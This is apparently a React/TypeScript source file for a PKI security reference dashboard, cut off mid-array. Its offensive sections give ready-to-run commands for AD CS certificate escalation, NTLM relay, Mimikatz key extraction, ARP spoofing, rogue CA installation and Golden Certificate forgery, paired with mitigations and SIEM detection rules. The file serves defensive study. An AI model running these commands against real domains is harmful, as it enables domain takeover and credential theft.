import { useState } from "react";

const COLORS = {
  bg: "#0a0c0f",
  bgCard: "#0f1318",
  bgCardHover: "#141920",
  bgMid: "#161b22",
  border: "#1e2733",
  borderAccent: "#2a3544",
  red: "#e05252",
  redDim: "#c0404040",
  redText: "#ff7070",
  green: "#3fb97a",
  greenDim: "#2a7a4a40",
  greenText: "#5dd99a",
  blue: "#4a9eff",
  blueDim: "#1a4a8040",
  blueText: "#7fbfff",
  amber: "#e8a838",
  amberDim: "#7a5010",
  amberText: "#f0c060",
  purple: "#9b6dff",
  purpleDim: "#4a2a8040",
  purpleText: "#bb97ff",
  teal: "#30c0c0",
  tealDim: "#10606040",
  tealText: "#60dfdf",
  text: "#d4dde8",
  textMid: "#8898aa",
  textDim: "#4a5568",
};

type TabId = "overview" | "offensive" | "defensive" | "recon" | "crypto" | "reference";

interface Tool {
  name: string;
  link?: string;
}

interface Section {
  id: string;
  icon: string;
  color: string;
  colorDim: string;
  colorText: string;
  label: string;
  category: string;
  severity?: string;
  tools: Tool[];
  description: string;
  detail: string[];
  commands?: string[];
  mitigations?: string[];
  detections?: string[];
  refs?: string[];
}

const offensiveData: Section[] = [
  {
    id: "esc1",
    icon: "⬆",
    color: COLORS.red,
    colorDim: COLORS.redDim,
    colorText: COLORS.redText,
    label: "ESC1–ESC16: AD CS Escalation Paths",
    category: "AD CS / ADPE",
    severity: "CRITICAL",
    tools: [{ name: "Certipy" }, { name: "Certify" }, { name: "Rubeus" }, { name: "Impacket" }],
    description:
      "Active Directory Certificate Services (AD CS) misconfigurations allow low-privileged domain users to escalate to Domain Admin or Enterprise Admin through certificate abuse. There are currently 16 documented ESC categories.",
    detail: [
      "ESC1 — Template allows ENROLLEE_SUPPLIES_SUBJECT: Any enrolling user can specify an arbitrary Subject Alternative Name (SAN), enabling enrollment of a certificate for any user including DA/EA. Requires CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag on template.",
      "ESC2 — Any Purpose EKU or no EKU: Template allows any purpose or omits EKU entirely. Certificate can be used for any authentication purpose.",
      "ESC3 — Enrollment Agent abuse: Misconfigured 'Certificate Request Agent' EKU allows enrolling certs on behalf of any user. Two-step chain: enroll enrollment agent cert → request cert as any user.",
      "ESC4 — Vulnerable ACL on template: Writable permissions (WriteDacl, WriteOwner, WriteProperty) on a template object allow an attacker to modify the template to introduce ESC1 conditions.",
      "ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA: CA-level flag that allows SAN specification on ALL templates, regardless of individual template settings. Often set inadvertently by administrators.",
      "ESC7 — CA ACL misconfiguration: User has ManageCA or ManageCertificates rights. ManageCA can enable EDITF_ATTRIBUTESUBJECTALTNAME2 or approve pending requests. ManageCertificates can approve failed requests.",
      "ESC8 — NTLM relay to HTTP enrollment endpoint: AD CS web enrollment (certsrv) does not enforce EPA by default. Relay captured NTLM auth to enroll a cert as victim — chain with PetitPotam/Coerce auth for DC machine cert → DCSync.",
      "ESC9/ESC10 — No-security extension & weak cert mapping: Exploit StrongCertificateBindingEnforcement=0 or CertificateMappingMethods weak config in combination with cert templates lacking szOID_NTDS_CA_SECURITY_EXT.",
      "ESC11 — Relay to RPC enrollment: Similar to ESC8 but targets the RPC-based enrollment interface (MS-ICPR) when NTLM is not enforced.",
      "ESC13 — OID Group Link abuse: Template with linked Group OID grants group membership upon enrollment — can escalate privileges via group membership.",
      "ESC15 — Schema v1 template with EKU override: Legacy schema version 1 templates allow EKU override during enrollment via ENROLLEE_SUPPLIES_SUBJECT on new domain-joined machines.",
    ],
    commands: [
      "# Enumerate all vulnerable templates and CAs",
      "certipy find -u user@corp.local -p 'Password1' -dc-ip 10.0.0.1 -vulnerable -stdout",
      "",
      "# ESC1 — Request cert as DA using SAN",
      "certipy req -u user@corp.local -p 'Password1' -ca 'CORP-CA' -template 'VulnTemplate' -upn 'administrator@corp.local'",
      "",
      "# ESC1 via Certify + Rubeus",
      "Certify.exe request /ca:dc01.corp.local\\CORP-CA /template:VulnTemplate /altname:administrator",
      "Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:pass /ptt",
      "",
      "# ESC8 — NTLM relay chain",
      "# Terminal 1: trigger auth from DC",
      "python3 PetitPotam.py -u user -p pass attacker_ip 10.0.0.1",
      "# Terminal 2: relay to certsrv",
      "python3 ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController",
      "",
      "# ESC6 — CA flag abuse",
      "certipy ca -u user@corp.local -p pass -ca 'CORP-CA' -enable-template SubCA",
      "certipy req -u user@corp.local -p pass -ca 'CORP-CA' -template SubCA -upn administrator@corp.local",
    ],
    mitigations: [
      "Disable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT on all non-PKI-admin templates",
      "Remove EDITF_ATTRIBUTESUBJECTALTNAME2 from all CAs: certutil -config 'CA' -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2",
      "Enable Manager Approval on all sensitive templates",
      "Audit and restrict enrollment ACLs — remove Domain Users/Authenticated Users from enrollment rights",
      "Enable EPA on AD CS web enrollment IIS endpoints (KB5005413)",
      "Enable LDAP signing and channel binding on all DCs",
    ],
    refs: ["SpecterOps: Certified Pre-Owned (whitepaper)", "CISA AA23-278A", "NIST SP 800-57"],
  },
  {
    id: "pkinit",
    icon: "🔑",
    color: COLORS.red,
    colorDim: COLORS.redDim,
    colorText: COLORS.redText,
    label: "Pass-the-Certificate / PKINIT Abuse",
    category: "Lateral Movement / Persistence",
    severity: "CRITICAL",
    tools: [{ name: "Rubeus" }, { name: "Certipy" }, { name: "gettgtpkinit (PKINITtools)" }],
    description:
      "A stolen or forged certificate + private key pair can be used to request a Kerberos TGT via PKINIT (RFC 4556), completely bypassing password-based authentication. Certificates persist 1–3 years by default — surviving password resets.",
    detail: [
      "PKINIT is a Kerberos pre-authentication mechanism using X.509 certificates instead of symmetric keys. The KDC validates the cert against its NTAuthCertificates store and issues a TGT.",
      "Shadow Credentials attack (ESC14-adjacent): Modify a target's msDS-KeyCredentialLink attribute to add an attacker-controlled key — then authenticate as the target via PKINIT without needing their certificate at all.",
      "UnPAC-the-Hash: After obtaining a PKINIT TGT, retrieve the NT hash of the target account via PKINIT AS-REP. Enables Pass-the-Hash and other hash-based attacks alongside cert-based auth.",
      "Machine certificate abuse: Machine certs (Domain Controller template) obtained via ESC8 relay allow PKINIT as the DC machine account — enabling DCSync, credential dumping, and complete domain compromise.",
      "Persistence: A certificate issued to a service account or privileged user provides authentication capability for the cert's lifetime. Even if the account password is reset, cert-based auth continues.",
    ],
    commands: [
      "# Request TGT using certificate (Rubeus)",
      "Rubeus.exe asktgt /user:administrator /certificate:admin.pfx /password:pfxpass /domain:corp.local /dc:10.0.0.1 /ptt",
      "",
      "# Certipy auth — request TGT and retrieve NT hash (UnPAC-the-hash)",
      "certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1",
      "",
      "# Shadow Credentials — add key credential to target",
      "certipy shadow auto -u attacker@corp.local -p pass -account targetuser",
      "",
      "# PKINITtools (Linux)",
      "python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass pass corp.local/administrator tgt.ccache",
      "KRB5CCNAME=tgt.ccache python3 getnthash.py corp.local/administrator",
    ],
    mitigations: [
      "Monitor Event ID 4768 for PKINIT-type pre-authentication (check PreAuthType=16 in event data)",
      "Enforce StrongCertificateBindingEnforcement=2 on all DCs (Full enforcement mode) — KB5014754",
      "Audit msDS-KeyCredentialLink attribute modifications (Event ID 5136 on AD objects)",
      "Restrict CA NTAuthCertificates to only explicitly approved CA thumbprints",
      "Set short certificate validity periods (30–90 days) on user-auth templates",
      "Enable Protected Users security group for all privileged accounts — blocks PKINIT TGT caching",
    ],
    refs: ["KB5014754 — Certificate-based authentication changes", "RFC 4556 (PKINIT)", "Shadow Credentials: PKINITtools"],
  },
  {
    id: "keyextract",
    icon: "🗝",
    color: COLORS.amber,
    colorDim: COLORS.amberDim,
    colorText: COLORS.amberText,
    label: "Private Key Extraction",
    category: "Credential Access",
    severity: "HIGH",
    tools: [{ name: "Mimikatz" }, { name: "SharpDPAPI" }, { name: "CertStealer" }, { name: "openssl" }],
    description:
      "Private keys stored in the Windows Certificate Store are protected by DPAPI. With appropriate access, keys can be extracted from LSASS memory, DPAPI master key blobs, registry, or local disk — including from RDP session caches and browser stores.",
    detail: [
      "DPAPI (Data Protection API) protects private keys using a master key derived from the user's password or the DPAPI domain backup key. Obtaining the domain DPAPI backup key enables decryption of all user DPAPI blobs across the domain.",
      "certutil -exportPFX: If private key is marked exportable, standard Windows tooling can export the PFX. Many misconfigured templates mark keys exportable.",
      "LSASS memory: Private keys for certs used in active TLS/Kerberos sessions may reside in LSASS memory and can be extracted with Mimikatz.",
      "Registry / disk: User certs are stored in HKCU\\Software\\Microsoft\\SystemCertificates. Machine certs in HKLM. Keys themselves are in %APPDATA%\\Microsoft\\Crypto\\RSA\\.",
      "Browser key stores: Chrome, Edge, Firefox each maintain certificate stores. TLS client certificates in browsers are DPAPI-protected and extractable with SharpChrome or similar.",
      "HSM key extraction probing: Weak HSM PINs (default: 1234, 0000), unrotated SO (Security Officer) passwords, or PKCS#11 slot enumeration can expose HSM-managed key handles.",
    ],
    commands: [
      "# Mimikatz — dump all certs from memory and disk",
      'crypto::capi ; crypto::cng ; crypto::certificates /systemstore:local_machine /store:"My" /export',
      "",
      "# SharpDPAPI — extract certs using DPAPI domain backup key",
      "SharpDPAPI.exe certificates /machine",
      "SharpDPAPI.exe certificates /pvk:domain_backup.pvk",
      "",
      "# certutil — export cert if marked exportable",
      "certutil -exportPFX -p 'password' My THUMBPRINT output.pfx",
      "",
      "# PKCS#11 — enumerate HSM slots and keys",
      "pkcs11-tool --list-slots --list-objects --module /usr/lib/libpkcs11.so",
      "",
      "# Extract DPAPI master keys (domain admin required)",
      "SharpDPAPI.exe masterkeys /rpc",
    ],
    mitigations: [
      "Mark all private keys as non-exportable in templates and during enrollment",
      "Store all CA and high-value cert keys in FIPS 140-3 Level 3 HSMs with non-extractable key policy",
      "Enable Credential Guard to protect LSASS from memory dumping",
      "Rotate DPAPI domain backup key annually and on suspected compromise (netdom resetpwd)",
      "Monitor certutil.exe -exportPFX invocations via process command-line logging (Sysmon Event 1)",
    ],
    refs: ["DPAPI Deep Dive — harmj0y", "SharpDPAPI documentation", "FIPS 140-3 Key Management"],
  },
  {
    id: "tlsmitm",
    icon: "↔",
    color: COLORS.amber,
    colorDim: COLORS.amberDim,
    colorText: COLORS.amberText,
    label: "TLS Interception & Downgrade",
    category: "Network / MITM",
    severity: "HIGH",
    tools: [{ name: "mitmproxy" }, { name: "Burp Suite" }, { name: "Bettercap" }, { name: "sslstrip2" }],
    description:
      "Intercept TLS sessions by inserting a rogue CA into the trust store, performing HSTS bypass, exploiting missing cert pinning, or forcing protocol downgrades. Enables plaintext credential capture, payload injection, and session hijacking.",
    detail: [
      "Rogue CA installation: With local admin or GPO access, install an attacker-controlled CA certificate into the machine and user trust stores. All subsequent TLS connections appear valid to affected clients.",
      "SSLstrip2 / HSTS bypass: For targets that have not preloaded HSTS, strip HTTPS to HTTP. For HSTS sites, exploit DNS rebinding or focus on unprotected subdomains.",
      "HPKP (HTTP Public Key Pinning) is deprecated and mostly removed; cert pinning in mobile/thick clients is the remaining barrier. Bypass via Frida dynamic instrumentation or Objection for mobile targets.",
      "TLS 1.0/1.1 downgrade: Against endpoints still accepting legacy TLS, force downgrade to enable BEAST, POODLE, or FREAK attacks on vulnerable cipher suites.",
      "ALPACA attack: Cross-protocol TLS request smuggling across services sharing a wildcard certificate (FTP, SMTP, IMAP serving same wildcard cert as HTTPS).",
      "DROWN attack: If any server on a shared cert allows SSLv2, private key can be factored and used to decrypt recorded TLS sessions from other servers using the same cert.",
    ],
    commands: [
      "# mitmproxy transparent intercept",
      "mitmproxy --mode transparent --ssl-insecure",
      "",
      "# Bettercap — ARP spoofing + SSL strip",
      "bettercap -eval 'arp.spoof on; net.sniff on; https.proxy on'",
      "",
      "# Generate rogue CA and install (post-exploitation)",
      "openssl req -new -x509 -days 3650 -keyout rogue-ca.key -out rogue-ca.crt -subj '/CN=RogueCA'",
      "certutil -addstore Root rogue-ca.crt  # Windows target",
    ],
    mitigations: [
      "Deploy HSTS preloading for all public domains (hstspreload.org)",
      "Implement certificate pinning in all internal applications and mobile apps",
      "Enforce TLS 1.2 minimum via Group Policy and TLS 1.3 preferred",
      "Monitor trust store modifications (Registry: HKLM\\SOFTWARE\\Microsoft\\SystemCertificates)",
      "Use CAA DNS records to restrict which CAs may issue for your domains",
      "Block SSLv2/3, TLS 1.0/1.1 at load balancer and firewall level",
    ],
    refs: ["ALPACA Attack (2021)", "DROWN Attack (2016)", "NIST SP 800-52 Rev 2"],
  },
  {
    id: "crlsuppress",
    icon: "✕",
    color: COLORS.amber,
    colorDim: COLORS.amberDim,
    colorText: COLORS.amberText,
    label: "Revocation Suppression (CRL/OCSP Block)",
    category: "Defense Evasion",
    severity: "MEDIUM",
    tools: [{ name: "iptables" }, { name: "Scapy" }, { name: "dnschef" }],
    description:
      "Most TLS stacks and Windows CAPI fail-open when revocation checking cannot reach the CRL Distribution Point or OCSP responder. Blocking revocation endpoints allows use of revoked or expired certificates without client rejection.",
    detail: [
      "Soft-fail behavior: RFC 5280 defines 'soft-fail' as the default — if revocation information is unavailable, most clients proceed with the connection. Only strict clients configured for hard-fail reject certs when revocation is unreachable.",
      "Network-level block: Drop DNS queries to crl.*.com or ocsp.*.com at the perimeter or on the compromised host's firewall. Clients waiting for revocation timeout (typically 10–15 seconds) then fail-open.",
      "OCSP response forgery: If you control the network path, return a forged 'good' OCSP response (though signature validation should prevent this without the OCSP signing key).",
      "Delta CRL staleness: If the CRL is not refreshed within its validity window (nextUpdate field), many clients treat it as unavailable and fail-open. Useful if you can prevent CRL publication/replication.",
      "Air-gapped environment exploitation: In disconnected environments, revocation checking is inherently broken. Document and exploit this in assessments of industrial control or classified networks.",
    ],
    commands: [
      "# Block OCSP and CRL endpoints at firewall (Linux)",
      "iptables -A OUTPUT -p tcp --dport 80 -d ocsp.usertrust.com -j DROP",
      "iptables -A OUTPUT -p tcp --dport 80 -m string --string 'crl' --algo bm -j DROP",
      "",
      "# DNS-level block (dnschef)",
      "dnschef --fakedomains 'crl.microsoft.com,ocsp.digicert.com' --fakeip 127.0.0.1",
    ],
    mitigations: [
      "Configure hard-fail revocation checking: certutil -setreg chain\\RevocationUrlRetrievalTimeout 10000 then enforce via GPO",
      "Deploy OCSP stapling on all TLS endpoints — moves revocation check server-side, not client-side",
      "Host CRL and OCSP endpoints internally with redundant distribution points",
      "Set CRL validity windows to 24h maximum for issuing CAs (reduces staleness window)",
      "Monitor for DNS query suppression and timeouts to CRL/OCSP hostnames in proxy logs",
    ],
    refs: ["RFC 5280 Section 6.3", "RFC 6960 (OCSP)", "CAB Forum Baseline Requirements §4.9"],
  },
  {
    id: "rogueCA",
    icon: "🏛",
    color: COLORS.red,
    colorDim: COLORS.redDim,
    colorText: COLORS.redText,
    label: "Rogue CA Deployment & Golden Certificate",
    category: "Persistence / Impact",
    severity: "CRITICAL",
    tools: [{ name: "certutil" }, { name: "Certipy" }, { name: "openssl" }],
    description:
      "After obtaining CA admin rights, deploy a rogue subordinate CA or backdoor the existing CA to issue certificates for arbitrary subjects. Golden Certificates (forged by extracting the CA private key) provide indefinite persistence — survives domain reimaging if the CA is not rebuilt.",
    detail: [
      "Golden Certificate: Extract the CA private key (via DPAPI, file system, or non-HSM backup) then use it to forge arbitrary certificates offline. The forged cert is cryptographically valid and will be trusted by all domain members.",
      "Shadow CA publication: Add a rogue CA certificate to NTAuthCertificates and the Enterprise Trust store via LDAP modification (requires DA or PKI admin). Domain members then trust certificates from the attacker-controlled CA.",
      "CA configuration backdoor: With ManageCA rights, add a certificate template that allows ENROLLEE_SUPPLIES_SUBJECT with low enrollment restrictions — creates a persistent privilege escalation path that survives template audits if the modification is subtle.",
      "SUBCA template enrollment: If the 'SubCA' template is enabled (it is by default on many CAs), an attacker with ManageCA can enroll a subordinate CA cert and issue arbitrary certs from it.",
      "Offline forgery via Certipy: Once CA private key PEM is extracted, forge certs offline with any UPN, SAN, or subject — no network access required, no CA log entry generated.",
    ],
    commands: [
      "# Extract CA private key (if not HSM-protected)",
      'SharpDPAPI.exe certificates /machine /target:"CA Certificate"',
      "certipy ca -backup -u admin@corp.local -p pass -ca 'CORP-CA'",
      "",
      "# Forge Golden Certificate offline",
      "certipy forge -ca-pfx corp-ca.pfx -upn administrator@corp.local -subject 'CN=Administrator'",
      "",
      "# Authenticate with Golden Cert",
      "certipy auth -pfx forged_admin.pfx -dc-ip 10.0.0.1",
      "",
      "# Add rogue CA to NTAuthCertificates (DA required)",
      "certutil -dspublish -f rogue-ca.crt NTAuthCA",
    ],
    mitigations: [
      "Protect all CA private keys in FIPS 140-3 Level 3 HSMs — non-extractable key policy enforced at hardware level",
      "Monitor NTAuthCertificates LDAP object for modifications (Event ID 5136 on PKI container)",
      "Enable CA audit logging for all certificate issuance and CA configuration changes",
      "Restrict ManageCA and ManageCertificates rights to dedicated PKI admin accounts with MFA",
      "Maintain offline inventory of all trusted CA thumbprints; alert on additions",
      "Regularly review NTAuthCertificates: certutil -viewdelstore -enterprise NTAuth",
    ],
    refs: ["SpecterOps: Golden Certificates", "CISA Advisory AA23-278A"],
  },
];

const defensiveData: Section[] = [
  {
    id: "adcs-harden",
    icon: "🛡",
    color: COLORS.green,
    colorDim: COLORS.greenDim,
    colorText: COLORS.greenText,
    label: "AD CS Comprehensive Hardening",
    category: "Hardening / Configuration",
    severity: "",
    tools: [{ name: "Certipy (audit)" }, { name: "Certify (audit)" }, { name: "PowerShell PKI module" }, { name: "ADCS hardening scripts" }],
    description:
      "Systematic hardening of Active Directory Certificate Services infrastructure to eliminate ESC1–ESC16 attack paths, enforce enrollment controls, and reduce the CA attack surface.",
    detail: [
      "Template audit procedure: Run Certipy/Certify in audit mode quarterly and after any PKI change. Review every template for: (1) ENROLLEE_SUPPLIES_SUBJECT flag, (2) enrollment ACLs permitting Domain Users/Authenticated Users, (3) Manager Approval disabled on sensitive templates, (4) EKU appropriateness for stated purpose.",
      "Enrollment endpoint hardening: Enable Extended Protection for Authentication (EPA) on all IIS enrollment endpoints. Require HTTPS; disable HTTP redirection. Apply KB5005413. Enable kernel-mode authentication on IIS.",
      "CA flag cleanup: Remove EDITF_ATTRIBUTESUBJECTALTNAME2 from all CAs. Disable SubCA template enrollment unless actively needed. Remove unused templates from CA publication.",
      "Role separation: Separate CA Administrator (manages CA config), Certificate Manager (approves/revokes), and Auditor roles into three distinct service accounts with distinct, managed passwords and MFA. No single account holds multiple roles.",
      "Offline Root CA: Root CA should be offline (powered off) except during CRL refresh (monthly) and subordinate CA cert renewal (annual). Boot from read-only media for critical operations.",
      "Two-person integrity: Require two authorized administrators physically present for root CA operations, CA backup restoration, and HSM PINs/key activation.",
    ],
    commands: [
      "# Full vulnerability scan",
      "certipy find -u admin@corp.local -p pass -dc-ip 10.0.0.1 -vulnerable -output pki-audit",
      "",
      "# Remove dangerous CA flag",
      'certutil -config "ca.corp.local\\CORP-CA" -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2',
      "net stop certsvc && net start certsvc",
      "",
      "# Audit NTAuthCertificates store",
      "certutil -viewdelstore -enterprise NTAuth",
      "certutil -TCAInfo",
      "",
      "# List all published templates",
      'certutil -CATemplates -config "ca.corp.local\\CORP-CA"',
      "",
      "# Force EPA on IIS certsrv (PowerShell)",
      "Import-Module WebAdministration",
      "Set-WebConfigurationProperty -pspath 'MACHINE/WEBROOT/APPHOST/Default Web Site/CertSrv' -filter 'system.webServer/security/authentication/windowsAuthentication' -name 'extendedProtection.tokenChecking' -value 'Require'",
    ],
    refs: ["DISA PKI/PKE STIG", "CIS Microsoft Windows Server Benchmark", "KB5005413", "SpecterOps Certified Pre-Owned"],
  },
  {
    id: "lifecycle",
    icon: "🔄",
    color: COLORS.green,
    colorDim: COLORS.greenDim,
    colorText: COLORS.greenText,
    label: "Certificate Lifecycle Management (CLM)",
    category: "Operations / Automation",
    severity: "",
    tools: [{ name: "Venafi TLS Protect" }, { name: "cert-manager" }, { name: "Smallstep step-ca" }, { name: "EJBCA" }, { name: "HashiCorp Vault PKI" }],
    description:
      "Automated management of certificate issuance, renewal, and revocation. Eliminates cert expiry outages, reduces manual error, enforces policy, and provides complete inventory visibility — critical for FedRAMP and FISMA compliance.",
    detail: [
      "ACME protocol (RFC 8555): Use an internal ACME-capable CA (Smallstep, EJBCA, Vault PKI) to automate cert issuance and renewal for internal services. Certificate lifetime of 90 days with auto-renewal at 60 days eliminates expiry risk.",
      "Kubernetes cert-manager: Manages TLS certificates for all k8s Ingress, Service, and Pod resources. Integrates with Vault, ACME, EJBCA, and AWS/GCP/Azure CAs. Renewal is fully automatic — no human intervention required.",
      "Enterprise CLM (Venafi): Provides complete visibility across all enterprise certs (AD CS, public CAs, cloud CAs). Policy enforcement prevents issuance outside approved parameters. Integrates with ITSM for change management.",
      "HashiCorp Vault PKI Secrets Engine: Issue short-lived certs (1–24h for service-to-service mTLS) directly from Vault. Revocation is implicit via short lifetime — no CRL/OCSP infrastructure needed for internal mTLS.",
      "Expiry monitoring: Alert at 60/30/14/7/1 day thresholds. P0 alert at expiry. Integrate with PagerDuty, Slack, or ServiceNow. Include cert details (CN, SAN, issuing CA, owner) in alerts.",
      "Certificate inventory: Maintain CMDB entries for every certificate including: thumbprint, CN/SAN, validity, issuing CA, private key location (HSM/file/TPM), owner, application, renewal owner.",
    ],
    commands: [
      "# Smallstep — issue short-lived internal cert (90d)",
      "step ca certificate service.internal.corp svc.crt svc.key --ca-url https://ca.internal --root root.crt --not-after 2160h",
      "",
      "# Vault PKI — issue cert with 24h TTL for mTLS",
      "vault write pki/issue/internal-services common_name=svc.internal.corp ttl=24h",
      "",
      "# cert-manager — ClusterIssuer for internal CA",
      "# kubectl apply -f clusterissuer-vault.yaml",
      "",
      "# Find all certs expiring within 30 days (across network)",
      "for host in $(cat hosts.txt); do",
      "  echo | openssl s_client -connect $host:443 2>/dev/null | openssl x509 -noout -enddate -subject 2>/dev/null",
      "done | grep -E '(notAfter|subject)' | paste - -",
      "",
      "# Bulk cert expiry scan with SSLyze",
      "sslyze --regular --targets_in=hosts.txt --json_out=cert_inventory.json",
    ],
    refs: ["RFC 8555 (ACME)", "NIST SP 800-57 Part 1 Rev 5", "FedRAMP PKI Requirements", "FISMA"],
  },
  {
    id: "detection",
    icon: "👁",
    color: COLORS.blue,
    colorDim: COLORS.blueDim,
    colorText: COLORS.blueText,
    label: "PKI Attack Detection & SIEM Rules",
    category: "Detection / Monitoring",
    severity: "",
    tools: [{ name: "Splunk" }, { name: "Microsoft Sentinel" }, { name: "Elastic SIEM" }, { name: "Zeek" }, { name: "Sigma rules" }],
    description:
      "Detection rules and alerting logic for AD CS attacks, certificate abuse, and PKI infrastructure compromise. Covers Windows Security events, LDAP monitoring, network-level TLS anomalies, and CT log alerting.",
    detail: [
      "Event ID 4887 (cert issued): Alert on issuance where RequesterName is not a known service account AND template is a user-auth template AND the cert contains a SAN not matching the requester UPN. Baseline normal patterns first.",
      "Event ID 4768 PreAuthType=16: PKINIT-based TGT request. Alert on PKINIT requests for any member of Domain Admins, Enterprise Admins, Schema Admins, or other Tier 0 accounts. Should be extremely rare or zero in most environments.",
      "Event IDs 4899/4900 (template modified): Any modification to a certificate template object should generate immediate alert and require change ticket validation. Template changes are a primary indicator of ESC4 exploitation.",
      "LDAP monitoring for NTAuthCertificates: Monitor the CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain> object for any attribute modifications. Unauthorized CA additions are high-confidence IOC.",
      "msDS-KeyCredentialLink modifications (Shadow Credentials): Monitor Event ID 5136 (directory object modified) for the msDS-KeyCredentialLink attribute on any user or computer object. Legitimate uses are limited to WHfB enrollment.",
      "Zeek + JA3/JA4 fingerprinting: Baseline internal TLS fingerprints. Alert on new JA3 hashes from endpoints, unexpected cipher suites (export ciphers, weak ECDH), or TLS connections to unusual ports. C2 frameworks have characteristic JA3 fingerprints.",
      "CT log monitoring: Subscribe your domains via certspotter, crt.sh API polling, or Censys alerts. Alert on: certs issued by unexpected CAs, wildcard certs not in approved list, certs with unexpected SANs.",
    ],
    commands: [
      "# Splunk — detect ESC1 exploitation (SAN mismatch)",
      'index=wineventlog EventCode=4887 | eval san=mvindex(split(Certificate_Information, "DNS Name="), 1) | where NOT match(Requester_Name, san)',
      "",
      "# Splunk — PKINIT auth by privileged accounts",
      "index=wineventlog EventCode=4768 Pre_Authentication_Type=16 | lookup domain_admins user AS Account_Name | where isnotnull(match)",
      "",
      "# Sigma rule — template modification",
      "# title: AD CS Certificate Template Modified",
      "# logsource: product=windows, service=security",
      "# detection: selection: EventID: [4899, 4900]",
      "",
      "# Zeek — extract TLS cert details to alert pipeline",
      "zeek -C -r capture.pcap policy/protocols/ssl/log-hostcerts-only",
      "",
      "# CT log monitoring via crt.sh API",
      "curl -s 'https://crt.sh/?q=%.corp.gov&output=json' | jq '.[] | {id, issuer_name, common_name, not_before}'",
      "",
      "# Monitor NTAuthCertificates changes (PowerShell)",
      '$dn = "CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local"',
      "Get-ADObject $dn -Properties cACertificate | Select -ExpandProperty cACertificate | ForEach-Object { [System.Security.Cryptography.X509Certificates.X509Certificate2]$_ }",
    ],
    refs: ["Sigma rules: PKI detections (SigmaHQ)", "Microsoft Sentinel: AD CS workbook", "CISA AA23-278A IOCs"],
  },
  {
    id: "hsm",
    icon: "🔒",
    color: COLORS.green,
    colorDim: COLORS.greenDim,
    colorText: COLORS.greenText,
    label: "HSM Configuration & Key Management",
    category: "Key Protection",
    severity: "",
    tools: [{ name: "Thales Luna Network HSM" }, { name: "Entrust nShield" }, { name: "AWS CloudHSM" }, { name: "Azure Dedicated HSM" }],
    description:
      "FIPS 140-3 Level 3 Hardware Security Modules protect CA private keys with physical tamper evidence and non-extractable key storage. Required for federal CA deployments under NIST SP 800-57 and FIPS 140-3.",
    detail: [
      "FIPS 140-3 Level 3 requirements: Physical tamper-evidence and tamper-response. Identity-based authentication required. Private keys must be zeroized on tamper detection. Requires two-factor auth for key access. Level 4 adds environmental failure protection for extreme threat environments.",
      "HSM network partitioning: Root CA HSM should be air-gapped (USB-connected Luna SA or nShield Solo). Issuing CA HSMs can be network-connected Luna Network HSM or nShield Connect, but in dedicated PKI VLAN with ACLs.",
      "Key ceremony procedures: Formal documented key ceremony for root CA key generation. Requires multiple designated Key Ceremony Officers (KCOs) present. Smart cards (M-of-N split key) distributed to KCOs. Full video recording. Chain of custody documentation.",
      "HSM PIN and SO password management: Change all default HSM PINs immediately on deployment. Use M-of-N (3-of-5 recommended) partition activation. Store SO credentials in approved secrets management (CyberArk, Vault). Rotate annually.",
      "Key backup and recovery: HSM key backups must also be to HSM (not software backup). Use HSM backup appliance or same-vendor backup token. Test restoration quarterly in isolated environment. Maintain hardware-encrypted backup media in secure off-site storage.",
      "Audit and compliance: All HSM operations logged to tamper-evident audit log. Log forwarded to SIEM. Annual HSM firmware updates applied. FIPS validation certificate reviewed against current NIST CMVP database.",
    ],
    commands: [
      "# Luna HSM — list partitions and key objects",
      "lunacm> partition list",
      "lunacm> partition showContents -partition PKI-CA",
      "",
      "# PKCS#11 — verify key is non-extractable",
      "pkcs11-tool --list-objects --module /usr/lib/libCryptoki2_64.so | grep -E '(label|extractable)'",
      "",
      "# Verify HSM FIPS mode",
      "lunacm> hsm showInfo | grep -i fips",
      "",
      "# openssl with PKCS#11 engine (issuing CA ops)",
      "openssl req -engine pkcs11 -keyform engine -key 'pkcs11:token=PKI-CA;object=IssuingCA' -new -out csr.pem",
    ],
    refs: ["NIST CMVP — FIPS 140-3 Validated Modules", "NIST SP 800-57 Part 2 Rev 1", "Thales Luna Key Ceremony Guide"],
  },
  {
    id: "pqc",
    icon: "⚛",
    color: COLORS.purple,
    colorDim: COLORS.purpleDim,
    colorText: COLORS.purpleText,
    label: "Post-Quantum Cryptography Migration",
    category: "Future-Proofing / Compliance",
    severity: "",
    tools: [{ name: "OQS-OpenSSL" }, { name: "liboqs" }, { name: "NIST PQC reference implementations" }, { name: "AWS s2n-tls (PQC)" }],
    description:
      "NIST finalized FIPS 203 (ML-KEM), FIPS 204 (ML-DSA), and FIPS 205 (SLH-DSA) in August 2024. Federal agencies face CISA/NSM directives to submit PQC migration plans and begin transitioning NSS-category systems. Harvest-Now-Decrypt-Later attacks are active.",
    detail: [
      "Harvest-Now-Decrypt-Later (HNDL): Nation-state adversaries are actively capturing encrypted federal traffic today to decrypt once sufficiently powerful quantum computers exist. Long-lived secrets (20+ year classification periods) are at risk NOW. Begin migration of highest-sensitivity data channels immediately.",
      "Algorithm selection: Use ML-KEM-768 (formerly CRYSTALS-Kyber) for key encapsulation/exchange. Use ML-DSA-65 (formerly CRYSTALS-Dilithium) for digital signatures. SLH-DSA (SPHINCS+) for stateless hash-based signatures where performance allows. Avoid XMSS/LMS for most uses (stateful — key state management is error-prone).",
      "Hybrid deployments: Until ML-KEM/ML-DSA are widely supported, use hybrid classical+PQC in TLS (X25519 + ML-KEM-768 hybrid key exchange, now supported in Chrome, Firefox, OQS-BoringSSL). This provides PQC protection while maintaining classical fallback.",
      "PKI migration path: Root CA → Issuing CA → End-entity cert chain must all be re-keyed to PQC. Root CA migration is the longest lead-time item — begin now. New root certs must be distributed to all trust stores before end-entity migration completes.",
